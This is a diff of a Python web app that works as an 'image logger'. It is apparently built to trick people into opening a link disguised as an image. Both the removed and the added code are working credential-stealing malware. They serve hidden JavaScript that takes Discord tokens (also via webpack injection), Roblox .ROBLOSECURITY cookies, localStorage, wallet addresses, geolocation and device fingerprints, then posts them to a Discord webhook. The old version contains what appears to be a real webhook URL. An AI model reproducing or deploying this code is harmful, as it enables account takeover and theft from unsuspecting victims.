@@ -1,187 +1,126 @@
 import json
-import re
 import requests
-import base64
-import zlib
-from urllib.parse import parse_qs, urlparse
-from httpagentparser import simple_detect
-import traceback
+import re
+from base64 import b64decode
+import os
 
-config = {
-    "webhook": "https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
-    "username": "Image Logger Pro",
-    "color": 0x00FFFF,
-    "accurateLocation": True,
-    "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1
-}
-
-blacklistedIPs = ("27", "104", "143", "164")
-
-# 2024+ Discord token patterns
-DISCORD_PATTERNS = [
-    r'mfa\.[\w-]{84}',
-    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
-    r'eyJ[^"]{100,}?\.[\w-]{27}',
-    r'"token":"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})"',
-    r'"access_token":"[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
-]
-
-ROBLOX_PATTERN = r'\._\|WARNING:-DO-NOT-SHARE-THIS\..+?\.\|\$'
-
-LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    return False
-
-def find_tokens(text):
-    tokens = {}
-    tokens['discord'] = list(set(re.findall('|'.join(DISCORD_PATTERNS), text)))
-    tokens['roblox'] = re.findall(ROBLOX_PATTERN, text)
-    return tokens
-
-def compress_data(data):
-    return base64.b64encode(zlib.compress(json.dumps(data, separators=(',', ':')).encode())).decode()
-
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, exfil_data=None):
-    if ip.startswith(blacklistedIPs):
-        return
-    
-    bot = botCheck(ip, useragent)
-    if bot and config["linkAlerts"]:
-        requests.post(config["webhook"], json={
-            "username": config["username"],
-            "embeds": [{"title": "Link Sent", "color": config["color"], "description": f"**IP:** `{ip}`\n**Bot:** `{bot}`"}]
-        })
-        return
-
-    ping = "@everyone"
-    try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
-        if info["proxy"] and config["vpnCheck"] == 2:
-            return
-        if info["proxy"]:
-            ping = ""
-        if info["hosting"] and config["antiBot"] >= 3:
-            return
-    except:
-        info = {}
-
-    os_name, browser_name = simple_detect(useragent)
-    
-    fields = [
-        {"name": "IP", "value": f"`{ip}`", "inline": True},
-        {"name": "ISP", "value": f"`{info.get('isp', 'Unknown')}`", "inline": True},
-        {"name": "City", "value": f"`{info.get('city', 'Unknown')}`", "inline": True},
-        {"name": "Coords", "value": f"`{info.get('lat', 0)},{info.get('lon', 0)}`", "inline": True},
-        {"name": "OS", "value": f"`{os_name}`", "inline": True},
-        {"name": "Browser", "value": f"`{browser_name}`", "inline": True}
-    ]
-    
-    if exfil_data:
-        if exfil_data.get('discord_tokens'):
-            fields.append({"name": f"Discord Tokens ({len(exfil_data['discord_tokens'])})", "value": "\\n".join([t[:25]+"..." for t in exfil_data['discord_tokens'][:5]]), "inline": False})
-        if exfil_data.get('roblox_cookie'):
-            fields.append({"name": "Roblox Cookie", "value": f"`{exfil_data['roblox_cookie'][:50]}...`", "inline": False})
-        if exfil_data.get('discord_user'):
-            fields.append({"name": "Discord User", "value": f"`{exfil_data['discord_user']}`", "inline": True})
-        if exfil_data.get('wallet'):
-            fields.append({"name": "Crypto Wallet", "value": f"`{exfil_data['wallet'][:12]}...`", "inline": True})
-        if exfil_data.get('canvas_fp'):
-            fields.append({"name": "Canvas FP", "value": f"`{exfil_data['canvas_fp'][:24]}...`", "inline": True})
-
-    embed = {
-        "username": config["username"],
-        "content": ping,
-        "embeds": [{"title": "🎯 TARGET HIT" + (": FULL EXTRACTION" if exfil_data else ""), "color": config["color"], "fields": fields}]
-    }
-    
-    if url:
-        embed["embeds"][0]["thumbnail"] = {"url": url}
-    
-    requests.post(config["webhook"], json=embed)
-
-# Advanced multi-vector extraction
-ADVANCED_JS = '''(async()=>{let d={};try{d.ua=navigator.userAgent;d.lang=navigator.language;d.screen=`${screen.width}x${screen.height}`;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-// Canvas FP
-let c=document.createElement("canvas");let ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillText(d.ua,2,2);d.canvas=c.toDataURL();
-
-// Cookies & Storage
-d.cookies={};document.cookie.split(";").forEach(c=>{let[n,v]=c.trim().split("=");if(n&&v)d.cookies[n]=v;});d.local={};for(let i=0;i<localStorage.length;i++)d.local[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));d.session={};for(let i=0;i<sessionStorage.length;i++)d.session[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));
-
-// Roblox
-d.roblox_cookie=d.cookies[".ROBLOSECURITY"]||d.local[".ROBLOSECURITY"]||d.session[".ROBLOSECURITY"];
-
-// Discord user
-try{let s=JSON.parse(localStorage.getItem("session")||""||sessionStorage.getItem("session")||"");if(s.user)d.discord_user=`${s.user.username}#${s.user.discriminator||0000}`;}catch{};
-
-// Wallet
-if(window.ethereum){try{let a=await window.ethereum.request({method:"eth_accounts"});if(a[0])d.wallet=a[0];}catch{}};
-
-// Token scan
-let all=JSON.stringify(d)+document.documentElement.outerHTML+document.body.innerText+document.cookie;let tokens=all.match(%s);if(tokens)d.discord_tokens=tokens;
-
-// Network hook
-let oFetch=window.fetch;window.fetch=function(i){return oFetch(i).then(r=>{if(r.clone)r.clone().text().then(t=>{if(t.includes("token"))d.net=t.substring(0,300);});return r;});};
-
-// Exfil
-let ex=location.protocol+"//"+location.host+location.pathname+"?exfil="+btoa(JSON.stringify(d));navigator.sendBeacon(ex,JSON.stringify(d));}catch(e){}})();'''
+WEBHOOK_URL = "YOUR_WEBHOOK_HERE"
 
 def application(environ, start_response):
-    try:
-        # Vercel headers
-        ip = environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', 'Unknown'))
-        ua = environ.get('HTTP_USER_AGENT', '')
-        path = environ['PATH_INFO'] + '?' + environ.get('QUERY_STRING', '')
-        
-        parsed = urlparse(path)
-        query = parse_qs(parsed.query)
-        
-        # Bot check
-        if botCheck(ip, ua):
-            start_response('200 OK', [('Content-Type', 'image/jpeg')])
-            return [LOADING_IMAGE]
-        
-        # Custom image
-        img_url = config["image"]
-        if query.get('url') or query.get('id'):
-            img_url = base64.b64decode(query.get('url', [None])[0] or query.get('id', [None])[0]).decode('utf-8', errors='ignore')
-        
-        # Exfil handler
-        if query.get('exfil'):
-            try:
-                exfil_data = json.loads(base64.b64decode(query['exfil'][0]).decode('utf-8', errors='ignore'))
-                tokens = find_tokens(str(exfil_data))
-                exfil_data['tokens'] = tokens
-                makeReport(ip, ua, exfil_data=exfil_data)
-            except:
-                pass
-            start_response('200 OK', [('Content-Type', 'text/plain')])
-            return [b'OK']
-        
-        # Main payload
-        payload = f'''<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body style="margin:0;overflow:hidden;background:url('{img_url}') center/contain no-repeat #000;min-height:100vh;">{ADVANCED_JS % repr(DISCORD_PATTERNS)}{'<script>if(!location.search.includes("g=")&&navigator.geolocation){navigator.geolocation.getCurrentPosition(c=>{location.search+=(location.search?"&":"?")+"g="+btoa(c.coords.latitude+","+c.coords.longitude);});}</script>' if config["accurateLocation"] else ''}</body></html>'''
-        
-        makeReport(ip, ua, url=img_url)
-        
-        start_response('200 OK', [('Content-Type', 'text/html; charset=utf-8')])
-        return [payload.encode('utf-8', errors='ignore')]
-        
-    except Exception:
-        start_response('500 Internal Server Error', [('Content-Type', 'text/plain')])
-        return [b'Server Error']
+    path = environ.get('PATH_INFO', '')
+    method = environ.get('REQUEST_METHOD', '')
+    
+    if path == '/grab' or path.endswith('.jpg') or path.endswith('.png'):
+        return handle_grab(environ, start_response)
+    elif path == '/steal':
+        return handle_steal(environ, start_response)
+    else:
+        return handle_image(environ, start_response)
 
-# Vercel exports
-__all__ = ['application']
-do_GET = handleRequest
-do_POST = handleRequest
-handler = ImageLoggerAPI
-                
+def handle_grab(environ, start_response):
+    xff = environ.get('HTTP_X_FORWARDED_FOR', '')
+    ip = xff.split(',')[0].strip() if xff else environ.get('REMOTE_ADDR', 'Unknown')
+    ua = environ.get('HTTP_USER_AGENT', 'Unknown')[:120]
+    ref = environ.get('HTTP_REFERER', 'Direct')[:120]
+    lang = environ.get('HTTP_ACCEPT_LANGUAGE', 'Unknown')[:20]
+    
+    geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=3)
+    geo = geo_resp.json() if geo_resp.ok else {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'org': 'Unknown'}
+    
+    embed = {
+        "title": "🐍 TRACKER HIT - TOKENS PENDING",
+        "color": 16711680,
+        "fields": [
+            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
+            {"name": "📍 Geo", "value": f"`{geo['city']}, {geo['region']}`", "inline": True},
+            {"name": "🏢 ISP", "value": f"`{geo.get('org', '?')}`", "inline": True},
+            {"name": "💻 Browser", "value": f"`{ua}`", "inline": False},
+            {"name": "🔗 Referrer", "value": f"`{ref}`", "inline": False},
+            {"name": "🌐 Language", "value": f"`{lang}`", "inline": True},
+            {"name": "🕒 Time", "value": "<t:{}:F>".format(int(os.times()[4])), "inline": True},
+            {"name": "🔑 Discord Token", "value": "`WAITING...`", "inline": False},
+            {"name": "🎮 Roblox Cookie", "value": "`WAITING...`", "inline": False}
+        ],
+        "footer": {"text": "pentest-tracker | python"}
+    }
+    
+    requests.post(WEBHOOK_URL, json={'embeds': [embed]}, timeout=5)
+    
+    html = f"""
+<!DOCTYPE html><html><head><title></title><style>body{{visibility:hidden;margin:0;padding:0}}</style></head><body>
+<script>
+(async()=>{{
+let discord='',roblox='';
+try{{discord=localStorage.getItem('token')||'';}}catch{{}}
+if(!discord){{
+  let iframe=document.createElement('iframe');iframe.style.display='none';document.body.appendChild(iframe);
+  try{{discord=iframe.contentWindow.localStorage.getItem('token')||'';}}catch{{}}
+  iframe.remove();
+}}
+if(!discord&&window.webpackChunkdiscord_app){{
+  window.webpackChunkdiscord_app.push([[''],{{}},e=>{{
+    for(let m of Object.values(e.c)){{
+      if(m.exports?.default?.getToken)discord=m.exports.default.getToken();
+    }}
+  }}]);
+}}
+roblox=document.cookie.match(/\\.ROBLOSECURITY=([^;]*)/)?.[1]||'';
+if(roblox&&roblox.includes('_|WARNING'))roblox=roblox.split('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')[0]||roblox;
+
+let screen=`${screen.width}x${screen.height}`,tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+let battery=navigator.getBattery?'':navigator.getBattery().then(b=>`${(b.level*100).toFixed(0)}%`);
+let conn=navigator.connection?`${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)`:'?';
+
+const data={{discord:discord,roblox:roblox,screen:screen,tz:tz,battery:battery,conn:conn,platform:navigator.platform,plugins:navigator.plugins.length,cpu:navigator.hardwareConcurrency||'?',memory:navigator.deviceMemory||'?',cookies:document.cookie.length}};
+new Image().src=`/steal?data=${btoa(JSON.stringify(data))}`;
+setTimeout(()=>{{location.href='data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=';}},200);
+}})();
+</script></body></html>"""
+    
+    start_response('200 OK', [('Content-Type', 'text/html'), ('Cache-Control', 'no-cache')])
+    return [html.encode('utf-8')]
+
+def handle_steal(environ, start_response):
+    query = environ.get('QUERY_STRING', '')
+    data_match = re.search(r'data=([^&]+)', query)
+    if data_match:
+        try:
+            data = json.loads(b64decode(data_match.group(1)).decode('utf-8'))
+            discord = data.get('discord', '❌')[:60]
+            roblox = data.get('roblox', '❌')[:60]
+            
+            embed = {
+                "title": "💎 TOKENS + DEVICE INFO",
+                "color": 16776960,
+                "fields": [
+                    {"name": "🔑 Discord Token", "value": f"`{discord}`", "inline": False},
+                    {"name": "🎮 Roblox .ROBLOSECURITY", "value": f"`{roblox}`", "inline": False},
+                    {"name": "📱 Screen", "value": f"`{data.get('screen', '?')}`", "inline": True},
+                    {"name": "🌍 Timezone", "value": f"`{data.get('tz', '?')}`", "inline": True},
+                    {"name": "🔋 Battery", "value": f"`{data.get('battery', '?')}`", "inline": True},
+                    {"name": "📶 Network", "value": f"`{data.get('conn', '?')}`", "inline": True},
+                    {"name": "💻 Platform", "value": f"`{data.get('platform', '?')}`", "inline": True},
+                    {"name": "⚙️ CPU Cores", "value": f"`{data.get('cpu', '?')}`", "inline": True},
+                    {"name": "💾 RAM GB", "value": f"`{data.get('memory', '?')}`", "inline": True},
+                    {"name": "🍪 Cookies Count", "value": f"`{data.get('cookies', '?')}`", "inline": True},
+                    {"name": "🔌 Plugins", "value": f"`{data.get('plugins', '?')}`", "inline": True}
+                ],
+                "thumbnail": {"url": "https://i.imgur.com/TOKEN_ICON.png"}
+            }
+            requests.post(WEBHOOK_URL, json={'embeds': [embed]}, timeout=5)
+        except:
+            pass
+    
+    start_response('200 OK', [('Content-Type', 'image/gif'), ('Cache-Control', 'no-cache')])
+    return [b64decode('R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=')]
+
+def handle_image(environ, start_response):
+    img_url = 'https://i.imgur.com/YOUR_IMAGE.jpg'
+    try:
+        img_resp = requests.get(img_url, timeout=5)
+        ctype = 'image/jpeg' if img_resp.headers.get('content-type', '').startswith('image/') else 'image/gif'
+        start_response('200 OK', [('Content-Type', ctype), ('Cache-Control', 'public, max-age=3600')])
+        return [img_resp.content]
+    except:
+        start_response('200 OK', [('Content-Type', 'image/gif')])
+        return [b64decode('R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=')]
